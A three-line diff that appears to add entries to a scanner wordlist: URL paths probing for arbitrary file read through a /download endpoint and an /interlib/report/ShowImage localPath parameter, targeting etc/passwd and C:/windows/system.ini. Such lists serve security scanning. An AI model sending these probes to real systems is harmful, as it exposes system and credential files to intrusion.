@@ -1,0 +1,3 @@
+/download/C%3a%2fwindows%2fsystem.ini
+/interlib/report/ShowImage?localPath=etc/passwd
+/interlib/report/ShowImage?localPath=C%3a%2fwindows%2fsystem.ini
